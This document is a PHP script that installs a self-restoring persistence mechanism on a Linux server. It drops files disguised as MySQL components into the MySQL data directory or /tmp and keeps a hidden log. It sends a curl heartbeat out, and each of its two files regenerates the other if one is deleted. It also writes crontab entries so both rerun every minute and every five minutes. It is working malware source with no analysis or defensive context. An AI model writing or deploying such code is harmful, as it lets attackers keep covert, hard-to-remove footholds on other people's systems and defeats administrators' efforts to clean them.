<?php
$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$sysHash = substr(md5(gethostname()), 0, 4);
$name1 = "mysql_daemon_" . $sysHash . ".php";
$name2 = "mysql_lib_" . $sysHash . ".php";
$path1 = $targetDir . $name1;
$path2 = $targetDir . $name2;
$logFile = $targetDir . ".mysql_audit.log";

function writeLog($msg) {
    global $logFile;
    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] [FILE1]: $msg\n", FILE_APPEND);
}

$ch = curl_init("https://google.com");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
writeLog("CURL Heartbeat. Status: " . curl_getinfo($ch, CURLINFO_HTTP_CODE));
curl_close($ch);

$offline_file2 = '<?php
$dir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$h = substr(md5(gethostname()), 0, 4);
$p1 = $dir . "mysql_daemon_" . $h . ".php";
$p2 = $dir . "mysql_lib_" . $h . ".php";
if (!file_exists($p1)) {
    file_put_contents($dir . ".mysql_audit.log", "[" . date("Y-m-d H:i:s") . "] [GUARDIAN]: File1 restored offline\n", FILE_APPEND);
    file_put_contents($p1, "<?php /* Emergency Restore */ ?>"); 
}
$c = shell_exec("crontab -l 2>/dev/null");
if (strpos($c, "mysql_lib_") === false) {
    file_put_contents("/tmp/.c2", $c . "\n*/5 * * * * /usr/bin/php $p2 > /dev/null 2>&1\n");
    exec("crontab /tmp/.c2");
}
?>';

if (!file_exists($path2)) {
    writeLog("ALERT: File2 missing. Restoring offline...");
    file_put_contents($path2, $offline_file2);
    chmod($path2, 0755);
}

$currentCron = shell_exec("crontab -l 2>/dev/null");
if (strpos($currentCron, $name1) === false) {
    $tmpCron = "/tmp/.c1_" . $sysHash;
    file_put_contents($tmpCron, $currentCron . "\n* * * * * /usr/bin/php $path1 > /dev/null 2>&1\n");
    exec("crontab $tmpCron && rm $tmpCron");
    writeLog("Fixed Crontab for File1");
}
?>
